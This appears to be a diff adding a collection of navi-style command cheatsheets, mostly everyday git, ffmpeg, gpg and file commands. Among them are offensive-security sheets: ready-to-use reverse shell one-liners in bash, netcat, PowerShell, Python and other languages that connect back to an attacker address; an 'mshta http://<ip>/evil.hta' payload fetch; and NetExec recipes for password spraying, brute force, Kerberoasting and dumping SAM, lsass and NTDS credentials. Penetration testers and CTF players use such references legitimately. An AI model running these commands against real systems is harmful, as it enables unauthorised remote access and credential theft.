+git fetch origin pull/<pr_number>/head:pr/<pr_number> \
+   && git checkout pr/<pr_number>
+
+# Add a new module
+git submodule add <repository> <path>
+
+# Update module
+git submodule update --init
+
+# Update module without init
+git submodule update
+
+# Pull all submodules
+git submodule foreach git pull origin master
+
+# Update all submodules
+git submodule update --init --recursive
+
+# Skip git hooks
+git commit --no-verify
+
+# Create new branch from current HEAD
+git checkout -b <new_branch_name>
+
+# Remove commits from local repository (destroy changes)
+git reset --hard HEAD~<number_of_commits>
+
+# Remove commits from local repository (keep changes)
+git reset --soft HEAD~<number_of_commits>
+
+$ branch: git branch | awk '{print $NF}'
+$ toplevel_directory: git rev-parse --show-toplevel
+$ unstaged_files: git status --untracked-files=no -s --porcelain | awk '{print $NF}' --- --multi true
+$ changed_files: git status --untracked-files=all -s --porcelain | awk '{print $NF}' --- --multi true
+
+==> cs__throw-expression.cheat <==
+% throw, expression, syntax, c#, cs, .net
+
+# Throw expression as assignment check
+
+Arg = arg ?? throw new System.ArgumentNullException(nameof(arg));
+
+# Throw expression within property
+
+string Name \
+{ \
+	get name; \
+	set => name = value \
+				?? throw new ArgumentNullException(nameof(name)); \
+}
+
+
+==> distros__pacman.cheat <==
+% pacman, arch
+
+# Import key
+pacman-key --recv-keys <keyid>
+
+# Add key from file
+pacman-key --add <keyfile>
+
+# Verify fingerprint of key
+pacman-key --finger <keyid>
+
+# Sync keys to pacman
+pacman-key --refresh-keys
+==> distros__zypper.cheat <==
+% zypper, suse
+
+# Audit SuSE with zypper: vulnerable packages 
+zypper lp | awk '{ if ($7=="security") { if ($11=="update") { print $13 } else { print $11 } } }' | sed 's/:$//' | grep -v "^$" | sort | uniq
+==> espeak.cheat <==
+% espeak
+
+# speak german text
+espeak -v de -s 143 -p 20 "<text>"
+
+# speak english text
+espeak -v en -s 145 -p 23 "<text>"
+
+==> ffmpeg_1.cheat <==
+% ffmpeg
+
+# translate
+ffmpeg \
+  -i "<input>" \
+  -filter:v scale=h='min(720\,ih)':w='min(1280\,iw)' \
+  -vcodec libx264 \
+  -preset <preset> \
+  -profile:v <profile> \
+  -acodec aac \
+  -ac 2 \
+  -ar 44100 \
+  "<output>" \
+  -hide_banner
+
+$ input : ls
+$ preset : echo -e "ultrafast\nsuperfast\nveryfast\nfaster\nfast\nmedium\nslow\nslower\nveryslow"
+$ profile : echo -e "baseline\nmain\nhigh"
+
+
+==> ffmpeg_2.cheat <==
+% ffmpeg, video
+
+# ffmpeg 视频文件进行ts切片
+ffmpeg -i <input_video> -c copy -map 0 -f segment -segment_list playlist.m3u8 -segment_time 5 output%03d.ts 
+
+# ffmpeg 发送 H264裸流
+ffmpeg -re -i ./IMG_1330.h264 -vcodec copy -f rtp rtp://127.0.0.1:6666>video.sdp
+ffmpeg -re -fflags +genpts -i ./IMG_1330.h264 -vf fps=30 -f rtp rtp://127.0.0.1:6666>video.sdp
+
+# ffmpeg 接收RTP流保存ts文件
+ffmpeg -protocol_whitelist rtp,udp,sdp,file -i video.sdp -c:v libx264 -c:a copy -f segment -segment_time 4 -segment_list test.m3u8 -segment_format mpegts stream%05d.ts
+ffmpeg -protocol_whitelist rtp,udp,sdp,file -i video.sdp -vf fps=30 -f hls -hls_time 3 -hls_playlist_type vod test.m3u8
+ffmpeg -protocol_whitelist rtp,udp,sdp,file -i video.sdp -vf fps=30 -f segment -segment_time 3 -segment_list test.m3u8 -segment_format mpegts stream%03d.ts
+
+# ffmpeg打开摄像头获取数据, 以RTP流形式发出
+ffmpeg -f avfoundation -framerate 30 -i "0" -target pal-vcd -f rtp rtp://127.0.0.1:6666>video.sdp
+
+# ffplay播放 rtmp流
+ffplay -i rtmp://localhost:1935/rtmplive/room
+
+# ffmpeg 下载m3u8的分片并合并
+ffmpeg -i "https://www.48iuz.com/20190207/AZWT115x/index.m3u8" -c copy media.mp4
+==> ffmpeg.cheat <==
+% ffmpeg, video
+
+# Get Video Info
+ffmpeg -i <video_file> -hide_banner
+
+# Extract Images from a Video into separate image files named image1.jpg, image2.jpg, and so on.
+ffmpeg -i <video_file> <cideo_file>_%d.jpg
+
+# Convert Images into Video - which will take all the images in the current folder (like "image1.jpg", "image2.jpg", etc.) 
+ffmpeg -f image2 -i image%d.jpg imagestovideo.mpg
+
+# Convert a Video to MP3 Format 
+ffmpeg -i <video_file> -vn -ar 44100 -ac 2 -ab 192 -f mp3 <video_file>.mp3
+
+# Convert Video to an animated, uncompressed gif file
+ffmpeg -i <video_file> <video_file>.gif
+
+# To convert a .avi file to an mpeg for dvd players
+ffmpeg -i <video_file>.avi -target pal-dvd -ps 2000000000 -aspect 16:9 <video_file>.mpeg
+
+# Extract audio or sound from a video file, and save it as MP3 file, use the following command:
+ffmpeg -i >video_file> -vn -ar 44100 -ac 2 -ab 192 -f mp3 <video_file>.mp3
+
+# Combine an audio file and a video file into a single multimedia file
+ffmpeg -i <audio_file> -i <video_file> <video_file>_w_audio.mpg
+
+# Increase video playback speed, run the following command with the -vf option, which sets the video filters that help to adjust the playback speed.
+ffmpeg -i <video_file> -vf "setpts=0.5*PTS" fast_<video_file>
+
+# Decrease video playback speed, run the following command with the -vf option, which sets the video filters that help to adjust the playback speed.
+ffmpeg -i <video_file> -vf "setpts=4.0*PTS" slow_<video_file> hide_banner
+
+# Add subtitle to a video file
+ffmpeg -i <video_file> -i <subtitle_file> -map 0 -map 1 -c copy -c:v libx264 -crf 23 -preset veryfast out_<video_file>
+
+# Add a cover poster or image to an audio file
+ffmpeg -loop 1 -i <image_file> -i <audio_file> -c:v libx264 -c:a aac
+==> file.cheat <==
+% file, find, search, zip
+
+# 当前目录查找文件
+find . -maxdepth 1 -name "<name>"
+
+# 从当前目录开始递归查找文件
+find . -name "<name>"
+
+# 列出某个目录下的所有文件
+find <dir> -type f -follow -print
+
+# 压缩某个目录下的所有文件(保留目录结构)
+find <dir> -type f -follow -print | zip <ZipFileName> -@
+
+# 压缩某个目录下的所有文件(忽略目录结构)
+find <dir> -type f -follow -print | zip -j <ZipFileName> -@
+
+
+# 压缩某个目录下的指定文件(保留目录结构)
+find <dir> -type f -name "<name>"  -follow -print | zip -@ <ZipFileName>  
+
+
+# 压缩某个目录下的指定文件(忽略目录结构)
+find <dir> -type f -name "<name>"  -follow -print | zip -j -@ <ZipFileName>  
+
+# 删除目录下的指定类型文件
+find <dir>  -type f -name '*.<suffix>' -exec rm -f {} \;
+==> fswatch.cheat <==
+% file change monitor
+
+# list available monitors by employing the -M or - list-monitors option:
+fswatch -M
+
+# list available monitors by employing the -M or - list-monitors option:
+fswatch --list-monitors
+
+# Set the latency in seconds, the default being 1 second.
+fswatch -l <latency> <file>
+
+# Using -t or --timestamp option prints the time stamp for every event
+fswatch --timestamp <file>
+
+# -x or --event-flags tells fswatch to print the event flags alongside the event path
+fswatch --events-flags <file>
+
+# To print the numeric value of an event indicating changes in your home directory and /var/log/auth.log file, use -n or --numeric option as below:
+fswatch --numeric <file>
+
+==> fuser.cheat <==
+% linux, process, files, sockets
+
+# Show which processes have TCP port xx socket open including details
+
+fuser --verbose --ipv4 <port>/<protocol>
+
+# Select namespace 'tcp' and select port xx to see which processes have the socket open with verbose for details
+
+fuser --verbose --namespace tcp <port>
+
+# Show all processes that have a file open at the specified mount point
+
+fuser --verbose --mount <mountpoint>
+==> git__add.cheat <==
+% git, add, changes
+
+# Stages all Changes
+git add -A
+
+# Stages new files and modifications, without deletions (on the current directory and its subdirectories).
+git add .
+
+# Stages modifications and deletions, without new files
+git add -u
+==> git.cheat <==
+% git, code
+
+# 覆盖提交
+git commit --amend
+
+# 查找丢失的提交记录
+git reflog
+
+# 统计某个用户的提交次数和行数
+git log --author=<name> --pretty=tformat: --numstat | awk '{ add += $1 ; subs += $2 ; loc += $1 - $2 } END { printf "added lines: %s removed lines : %s total lines: %s\n",add,subs,loc }'
+
+# 统计所有人的提交次数
+git shortlog -s -n
+
+# 删除远程tag
+git push origin :refs/tags/<tag>
+
+# 删除远程分支
+git push origin :<remote_branch>
+
+$ remote_branch: git ls-remote --- --column 1
+
+
+# 生成两个提交之间的patch(包含两个commit)
+git format-patch <commit1>..<commit2>
+
+# 生成某个提交的patch
+git format-patch -1 <commit>
+
+$ commit: git log -20 --oneline --- --column 0
+
+# 检查patch文件
+git apply --stat <patch>
+
+
+# 检查patch文件是否可以使用
+git apply --check <patch>
+
+
+# 使用patch文件
+git am -s < <patch>
+
+$ patch: find . -name '*.patch'
+
+
+# 查看当前分支结构
+git log --graph --decorate --oneline --simplify-by-decoration --all
+
+
+# 查看当前分支结构(gitk)
+gitk --simplify-by-decoration --all
+
+
+# 查看总提交次数
+git rev-list HEAD --count
+
+
+# 查看某个用户提交汇总
+git log --author="<name>" --pretty=tformat: --numstat | awk '{ add += $1; subs += $2; loc += $1 - $2 } END { printf "added lines: %s, removed lines: %s, total lines: %s\n", add, subs, loc }'
+==> git__config.cheat <==
+% git, config, email, user
+
+    # Config username
+git config --global user.name <name>
+
+# Config email
+git config --global user.email <email>
+
+# Config default git editor
+git config --global core.editor <editor:emacs/vim/nvim/code>
+
+# Check config
+git config --list
+==> git__gh.cheat <==
+% github, github-cli, gh
+
+# Login with gh
+gh auth login
+
+% github, github-cli, gh, api
+
+# Get starred repos by authenticated user (table with only name and description)
+gh api \
+  -H "Accept: application/vnd.github+json" \
+  -H "X-GitHub-Api-Version: 2022-11-28" \
+  -H "per_page: 100" \
+  /user/starred --jq ".[] | [.name, .description] | @tsv"
+
+# print only specific fields from the response
+gh api repos/<owner>/<repo>/issues --jq '.[].title'
+
+# use a template for the output
+gh api repos/<owner>/<repo>/issues --template \
+  '{{range .}}{{.title}} ({{.labels | pluck "name" | join ", " | color "yellow"}}){{"\n"}}{{end}}'
+
+# list releases with GraphQL
+gh api graphql -F owner='{owner}' -F name='{repo}' -f query='
+  query($name: String!, $owner: String!) {
+    repository(owner: $owner, name: $name) {
+      releases(last: 3) {
+        nodes { tagName }
+      }
+    }
+  }
+'
+
+# list all repositories for a user
+gh api graphql --paginate -f query='
+  query($endCursor: String) {
+    viewer {
+      repositories(first: 100, after: $endCursor) {
+        nodes { nameWithOwner }
+        pageInfo {
+          hasNextPage
+          endCursor
+        }
+      }
+    }
+  }
+'
+
+# Lists the feeds available to the authenticated user. 
+
+gh api \
+  -H "Accept: application/vnd.github+json" \
+  -H "X-GitHub-Api-Version: 2022-11-28" \
+  /feeds
+==> git__git.cheat <==
+% git
+
+# Get branch name of current branch
+git symbolic-ref --short HEAD
+
+# Remove branches that have already been merged with main a.k.a. ‘delete merged'
+git branch --merged | grep -v '\*\|master\|main\|dev' | xargs -n 1 git branch -d
+
+# Find tags containing commit
+git describe --always --contains <commit_id>
+
+# Find branches containing commit
+git branch -a --contains <commit_id>
+
+# Show the diff between the latest commit and the current state
+git diff-index --quiet HEAD -- || clear; git --no-pager diff --patch-with-stat
+
+# List config from ~/.gitconfig.user
+git config --file ~/.gitconfig.user -l
+
+# Configure user and mail in ~/.gitconfig.user
+git config --file ~/.gitconfig.user  user.name <author_name> /
+git config --file ~/.gitconfig.user  user.email <email>
+
+# Change author of a commit
+git commit --amend --author="<author_name> \<<email>\>"
+
+# Re-sign previous commits with a new gpg key
+git rebase <commit> --exec 'git commit --amend --no-edit -S'
+
+# List modified files
+git status --porcelain | awk 'match($1, "M"){print $2}'
+
+# List deleted files
+git status --porcelain | awk 'match($1, "D"){print $2}'
+
+# List staged files
+git diff --name-only --cached
+
+# List staged files only added and modified
+git diff --name-only --cached --diff-filter=AM
+
+# List stages files and the working directory only
+comm -23 <(git diff --cached --name-only) <(git diff --name-only)
+
+==> git__glab.cheat <==
+% gitlab, glab, gitlab-cli
+
+
+% gitlab, glab, gitlab-cli, repos
+
+# create a repository under your account using the current directory name
+glab repo create
+  
+# create a repository under a group using the current directory name
+glab repo create --group <group>
+
+# create a repository with a specific name
+glab repo create <repo>
+  
+# create a repository for a group
+glab repo create <group>/<repo>
+
+
+==> gitguardian.cheat <==
+% gitguardian, vulnerabilities
+@ gitguardian, secrets
+
+# search for secrets in files
+ggshield secret scan path -r <path>
+
+# search for secrets in repo
+ggshield secret scan repo -r <path>
+
+# search for secrets in docker images
+ggshield secret scan docker <image>:<tag>
+
+# search for secrets in Pypi packages
+ggshield secret scan pypi <package>
+
+@ gitguardian, vulnerabilities
+
+# search for vulnerabilities in your IaC files
+ggshield iac scan all <path>
+
+# search for new potential IaC vulnerabilities
+ggshield iac scan diff --ref=HEAD~1 . 
+
+
+==> git__remote.cheat <==
+% git, remote, origin
+
+# Add remote repo
+git remote add origin <url>
+
+# Verify remote added repo
+git remove -v
+
+==> gnome.cheat <==
+% gnome
+
+# set default terminal application
+gsettings set org.gnome.desktop.default-applications.terminal exec <console>
+
+# dump dconf to file
+dconf dump <path> > dump.dconf
+
+==> gpg.cheat <==
+% gpg
+$ key_name: gpg --list-keys --with-colons | awk -F: '$1 == "uid" {print $8" "$10}' --- --column 1 --delimiter ' '
+
+# Export Public Key as armored ASCII
+gpg --output <output_filename> --armor --export <key_name>
+
+# List pgp keys
+gpg --list-keys --with-colons | awk -F: '$1 == "uid" {print $8 "\t" $10 }'
+
+# To locate the key of a user, by email address:
+gpg --auto-key-locate keyserver --locate-keys <email>
+
+# Refresh all your keys (e.g. new revocation certificates and subkeys)
+gpg --refresh-keys
+
+# Upload and verify key to keys.openpgp.org
+gpg --export <email> | curl -T - https://keys.openpgp.org
+
+# Generate revoke key
+gpg --output revoke.asc --gen-revoke <key_name>
+
+# Import revocation certificate into your keyring
+gpg --import revoke.asc
+
+# Search your key on the keyserver
+gpg --keyserver <keyserver> --search-key <key_name>
+
+# Generate a lot of random passwords
+gpg --gen-random --armor 1 
+
+# Generate a random password of a given lenght
+gpg --gen-random --armor 1 <length>
+==> infosec__evil-winrm.cheat <==
+% Evil-WinRM
+
+;$ ip: $ip
+;$ username: ''
+;$ password:  ''
+
+# Connect to WinRM with Username/Password
+docker run --rm -tiv $PWD:/data --name evil-winrm oscarakaelvis/evil-winrm -i <ip> -u '<username>' -p '<password>'
+
+==> infosec__fuzzers.cheat <==
+% Fuzzers
+
+$ target: if [[ ! -z $target ]]; then echo $target; fi
+$ scheme: echo "http https" | tr " " "\n"
+$ wordlists: fdfind . /usr/share/{seclists,wordlists} /usr/share/amass/ -Ltf | sort -u
+$ file_exts: echo "php txt cgi html htm js css png jpg jpeg gif svg bmp" | tr ' ' '\n' --- --multi --map "navi fn map::expand"
+$ file_exts_comma: echo "<file_exts>" | tr ' ' ','
+
+# Feroxbuster (faster)
+
+feroxbuster -eBEg --auto-tune --scan-limit 3 -u <scheme>://<target> --wordlist <wordlists>
+
+# Feroxbuster (slower [exts: php txt cgi html js])
+
+feroxbuster -eBEg --auto-tune --scan-limit 3 -u <scheme>://<target> --wordlist <wordlists> -x <file_exts>
+
+# Gobuster (faster)
+
+gobuster -t 15 dir -u <scheme>://<target> -w <wordlists> | tee <target>.$(basename $PWD).gobuster.txt
+
+# Gobuster (slower [exts: php txt cgi html js])
+
+gobuster -t 15 dir -u <scheme>://<target> -w <wordlists> -x <file_exts_comma> | tee <target>.$(basename $PWD).gobuster-extended.txt
+
+# wfuzz (POST [required:FUZZ in params])
+
+wfuzz -c -z range,<min_range>-<max_range> -d "<params>" -X POST -u <target>
+
+# ffuf
+
+ffuf smth smth smth todo:(RitchieS)
+
+# hydra [ssh] (user/password file)
+
+hydra -L users.txt -P pass.txt <target> -t 16 ssh
+
+# hydra [ftp] (user/password file)
+
+hydra -L users.txt -P pass.txt <target> -t 16 ftp
+
+# hydra [ssh] (user file/static password) 
+
+hydra -L users.txt -P <pass> <target> -t 16 ssh
+
+# hydra [ftp] (user file/static password)
+
+hydra -L users.txt -P <pass> <target> -t 16 ftp
+
+# hydra [ssh] (static user/password file) 
+
+hydra -L <user> -P pass.txt <target> -t 16 ssh
+
+# hydra [ftp] (static user/password file)
+
+hydra -L <user> -P pass.txt <target> -t 16 ftp
+
+==> infosec__mssqlclient.cheat <==
+% Impacket MSSQL Client
+
+;$ ip: $ip
+;$ username: ''
+;$ password:  ''
+
+# MSSQLClient connect with username/password
+mssqlclient.py -show '<username>':'<password>'@<ip> -windows-auth
+
+==> infosec__netexec.cheat <==
+% NetExec / CrackMapExec
+
+;$ ip: $ip
+;$ username: ''
+;$ password:  ''
+;$ relay-file: 'relay-list.txt'
+;$ command: 'mshta.exe http://<ip>/evil.hta'
+
+# SMB Connectivity Check
+nxc smb <ip>
+
+
+## Enumerating SMB shares
+
+# SMB Share NULL session
+nxc smb <ip> -u '' -p ''
+# SMB Share Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth
+# SMB Share Guest session
+nxc smb <ip> -u 'guest' -p ''
+# SMB Share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>'  # or -H '<hash>'
+
+
+## Spider SMB shares
+
+# Spider SMB Share NULL session
+nxc smb <ip> -u '' -p '' -M spider_plus
+# Spider SMB Share Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth -M spider_plus
+# Spider SMB Share Guest session
+nxc smb <ip> -u 'guest' -p '' -M spider_plus
+# Spider SMB Share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus
+
+# Spider+Download SMB Share NULL session
+nxc smb <ip> -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# Spider+Download SMB Share Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# Spider+Download SMB Share Guest session
+nxc smb <ip> -u 'guest' -p '' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+# Spider+Download SMB Share Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
+
+
+## Working files on with SMB Shares
+
+# NetExec SMB Upload file on remote
+nxc smb <ip> -u '<username>' -p '<password>' --put-file <local-file> <remote-file>
+# NetExec SMB Download file from remote
+nxc smb <ip> -u '<username>' -p '<password>' --get-file <remote-file> <local-file>
+
+
+# Get SMB relays with no SMB signing
+nxc smb <ip> --gen-relay-list <relay-file>
+
+
+# Execute Command or file
+nxc smb <ip> -u '<username>' -p '<password>' -x '<command>'
+
+
+## Enumerating Password Policy
+
+# Password Policy NULL session
+nxc smb <ip> -u '' -p '' --pass-pol
+# Password Policy Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --pass-pol
+# Password Policy Guest session
+nxc smb <ip> -u 'guest' -p '' --pass-pol
+# Password Policy Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' --pass-pol
+
+
+## SMB password spraying
+
+# SMB Password Spray with user/pass list
+nxc smb <ip> -u user.txt -p pass.txt
+
+# SMB Password Spray with user/pass list (contiunue/no bruteforcing)
+nxc smb <ip> -u user.txt -p pass.txt --continue-on-success --no-bruteforce
+
+
+## Enumerating Users
+
+# Enumerate Users NULL session (SMB)
+nxc smb <ip> -u '' -p '' --users
+# Enumerate Users NULL session (LDAP)
+nxc ldap <ip> -u '' -p '' --users
+# Enumerate Users Anonymous session (SMB)
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --users
+# Enumerate Users Anonymous session (LDAP)
+nxc ldap <ip> -u 'anonymous' -p '' --local-auth --users
+# Enumerate Users Guest session (SMB)
+nxc smb <ip> -u 'guest' -p '' --users
+# Enumerate Users Guest session (LDAP)
+nxc ldap <ip> -u 'guest' -p '' --users
+# Enumerate Users Authenticated session (SMB)
+nxc smb <ip> -u '<username>' -p '<password>' --users
+# Enumerate Users Authenticated session (LDAP)
+nxc ldap <ip> -u '<username>' -p '<password>' --users
+
+# Enumerate users by bruteforcing the RID + save users list (10000 is optional)
+nxc smb <ip> -u guest -p '' --rid-brute 10000 --log rid-brute.txt
+# Enumerate Logged-on Users (Authenticated)
+nxc smb <ip> -u '<username>' -p '<password>' --loggedon-users
+
+# Get user's description
+nxc ldap <ip> -u '<username>' -p '<password>' -M get-desc-users
+
+
+## Enumerating Groups
+
+# Enumerate Groups NULL session
+nxc smb <ip> -u '' -p '' --groups
+# Enumerate Groups Anonymous session
+nxc smb <ip> -u 'anonymous' -p '' --local-auth --groups
+# Enumerate Groups Guest session
+nxc smb <ip> -u 'guest' -p '' --groups
+# Enumerate Groups Authenticated session
+nxc smb <ip> -u '<username>' -p '<password>' --groups
+
+
+## FTP
+
+# List files on FTP server
+nxc ftp <ip> -u '<username>' -p '<password>' --ls
+# List files on FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --ls '<path>'
+# Download file from FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --get '<file>'
+# Upload file from attacker to FTP server (specific path)
+nxc ftp <ip> -u '<username>' -p '<password>' --put <LOCAL_FILE> <REMOTE_FILE>
+
+# Asreproast- Get and try cracking user account hash
+nxc ldap <ip> -u '<username>' -p '' --asreproast asreproast.txt --kdcHost <ip>
+# Impacket Asreproast
+GetNPUsers.py <target> -usersfile users.txt -dc-ip <ip>
+# Kerberoasting - Get and try cracking SPN account hash
+nxc ldap <ip> -u '<username>' -p '<password>' --kerberoasting kerberoasting.txt --kdcHost <ip>
+# Impacket Kerberoasting
+GetUserSPNs.py -usersfile users.txt -no-pass -dc-ip <ip> -dc-host <ip> <target> -target-domain <domain>
+
+## NetExec Query LDAP
+
+
+# NetExec Query LDAP (example 1)
+nxc ldap <ip> -u '' -p '' --query "(objectclass=*)" ""
+# NetExec Query LDAP (example 2)
+nxc ldap <ip> -u '' -p '' --query "(sAMAccountName=<username>)" ""
+# LDAPSearch Query LDAP
+ldapsearch -o ldif_wrap=no -xLLLH ldap://<ip> -D '<domain>\<username>' -w '<password>' -b "DC=intelligence,DC=htb" '(samaccountname=<username>)'
+
+
+## Passwords
+
+# Extract the SAM File + Dump Cached Passwords
+nxc smb <ip> -u '<username>' -p '<password>' --sam --lsa --dpap
+# Dump lsass with lsassy module:
+nxc smb <ip> -u '<username>' -p '<password>' -M lsassy -o METHOD=comsvcs_stealth
+# Extract passwords from the NTDS (dcsync)
+nxc smb <ip> -d <domain> -u '<username>' -p '<password>' --ntds
+
+## Get GPP policies
+
+# `gpp_password` decrypts passwords stored in the Group.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_password
+# `gpp_autologin` retrieves autologin information from the Registry.xml file
+nxc smb <dc-ip> -u '' -p '' -M gpp_autologin
+
+## Group Managed Service Accounts (gMSA)
+
+# Requirements: user that can read msDS-ManagedPassword (Domain Admins cant read it by defualt)
+nxc ldap <ip> -u '<username>' -p '<password>' --gmsa
+
+## LAPS (Local administrator password solution) - retrieves both LAPS v1 and v2 passwords
+
+# Requirements: Domain Admins or user that have Read/WriteProperty to the ms-MCS-AdmPwd attribute
+nxc smb <ip> -u '<username>' -p '<password>' --laps    # add --lsa use the laps admin to dump lsa
+
+## Check for Spooler Service
+nxc smb <ip> -u '<username>' -p '<password>' -M spooler
+
+## Check for WebDav Service
+nxc smb <ip> -u '<username>' -p '<password>' -M webdav
+
+## Azure - Entra Connect Sync service username looks like 'MSOL_16fb75d0227d'
+
+# Microsoft Online
+nxc smb <ip> -u '<username>' -p '<password>' -M msol # Requirements: 'ADSyncAdmins' or 'local Administrators groups' on machine with AD Connect service to get the MSOL account password and dcsync with it
+# Microsoft Online #2
+nxc smb <ip> -u '<username>' -p '<password>' -M msol -o MSOL_PS1=C:\...\nxc\data\msol_dump\msol_dump.ps1
+
+
+## mssql_priv
+
+# NetExec MsSQL (Check authentication)
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth --port 1434
+# NetExec MsSQL (privesc module)
+nxc mssql <ip> -u '<username>' -p '<password>' -M mssql_priv -o ACTION=privesc
+# NetExec MsSQL: Execute Windows Commands (xp_cmdshell)
+nxc mssql <ip> -u sa -p '<password>' --local-auth -x whoami
+# Execute MSSQL commands
+nxc mssql <ip> -u '<username>' -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+
+
+## WMI
+
+# WMI: Execute Commands
+nxc wmi <ip> -u '<username>' -p '<password>' -x whoami
+
+
+## Read DACL Rights
+
+# Read all the ACEs of a user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<username> ACTION=read
+# Read all rights PRINCIPAL user have on TARGET user
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET=<t_user> ACTION=read PRINCIPAL=<p_user>
+# Find users with DCSync rights on this domain
+nxc ldap <dc-ip> -u '<username>' -p '<password>' --kdcHost <dc-ip> -M daclread -o TARGET_DN="DC=htb,DC=LOCAL" ACTION=read RIGHTS=DCSync
+
+## Enumerate Domain Trusts
+nxc ldap <ip> -u '<username>' -p '<password>' -M enum_trusts
+
+==> infosec__reverse-shells.cheat <==
+% Reverse Shells
+
+$ local_ip: echo $(ip -br a sh dev tun0 2>/dev/null||ip -br a sh dev eth0) | awk '{print $3}' | cut -d '/' -f1
+$ port: echo '443 1234 4444 32000' | tr ' ' '\n'
+$ shell: echo '/bin/bash /bin/zsh /bin/ash /bin/dash /bin/ksh /bin/sh bash zsh ash dash ksh sh' | tr ' ' '\n'
+
+# bash
+
+bash -c 'exec <shell> -i &>/dev/tcp/<local_ip>/<port> <&1'
+
+# zsh
+
+zsh -c 'zmodload zsh/net/tcp && ztcp <local_ip> <port> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
+
+# netcat
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|<shell> -i 2>&1|nc <local_ip> <port> >/tmp/f
+
+# php
+
+php -r '$sock=fsockopen("<local_ip>","<port>");exec("<shell> -i <&3 >&3 2>&3");'
+
+
+# powershell
+
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<local_ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# perl
+
+perl -e 'use Socket;$i="<local_ip>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("<shell> -i");};'
+
+# python
+
+python -c 'import os,pty,socket,sys;s=socket.socket();s.connect((("127.0.0.1"),int("<port>")));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("<shell>");'
+
+# ruby
+
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<local_ip>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# telnet
+
+TF=$(mktemp -u); mkfifo $TF && telnet <local_ip> <port> 0<$TF | <shell> 1>$TF
+
+# stabilized fancy beefy gordita crunch shell
+
+stty raw -echo; (echo 'python3 -c "import pty;pty.spawn(\"<shell>\")" || python -c "import pty;pty.spawn(\"<shell>\")"' ;echo "stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)"; echo reset; echo id;cat) | nc -lvnp <port> && reset
+
+==> infosec__scanners.cheat <==
+% Scanners
+
+;$ ip:
+$ common_ports: 
+
+# rustscan
+sudo rustscan -b 8192 -u 16384 -a <ip> -- -sS -sV -sC -oN <ip>.$(basename $PWD).nmap.txt
+
+# rustscan (higher timeout + retries)
+sudo rustscan -t 3000 --tries 2 -b 8192 -u 16384 -a <ip> -- -sS -sV -sC -oN <ip>.$(basename $PWD).nmap.txt
+
+# nmap
+sudo nmap -p<ports> -sS -sV -sC -v -oN <ip>.$(basename $PWD).nmap.txt <ip>
+
+# nmap (vuln scripts)
+sudo nmap -p<ports> -sS -sV -sC -v --script=vuln -oN <ip>.$(basename $PWD).nmap.txt <ip>
+
+==> ip.cheat <==
+% ip, udp, tcp, http
+
+# 扫描服务器端口是否开放
+nc -vv <IP> <PORT>
+
+# tcpdump 抓包输出pcap文件
+tcpdump -i eth0 -A -s 0 'dst or src (<host1> or <host2>) and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)' -w httpdump-2018062711.pcap
+
+
+# 安装tinyproxy代理服务器, 配置文件路径/etc/tinyproxy.conf
+apt install tinyproxy
+
+# 启动tinyproxy代理服务器
+sudo service tinyproxy start
+
+# 重启tinyproxy代理服务器
+sudo service tinyproxy restart
+
+# 停止tinyproxy代理服务器
+sudo service tinyproxy stop
+
+==> lsfd.cheat <==
+% linux, file descriptors
+
+# Show open file descriptors for PIDs
+
+lsfd --pid <pids>
+==> lsns.cheat <==
+% linux, namespaces
+
+# Show all available namespaces
+
+lsns
+==> misc__compression.cheat <==
+% compression
+
+# Create a tar containing files
+tar cf <name>.tar <files>
+
+# Extract the files from a tar
+tar xf <tar_file>
+
+# Create a tar with Gzip compression
+tar czf <name>.tar.gz <files> 
+
+# Extract a tar using Gzip
+tar xzf <targz_file>
+
+# Compress file and appends .gz to its name
+gzip <path>
+
+# Decompress compressed file
+gzip -d <gz_file>
+
+$ path: ls
+$ tar_file: ls *.tar
+$ targz_file: ls *.tar.gz
+$ gz_file: ls *.gz
+
+==> misc__misc.cheat <==
+% Misc Linux & Applications
+
+# Edit filenames in current directory in you $EDITOR
+vidir
+
+# List all processes by user and pipe to less
+ps aux | less
+
+# Untar a gzip'ed file
+tar -xzvf <GzipTarFile>
+
+# Untar a bzip'ed file
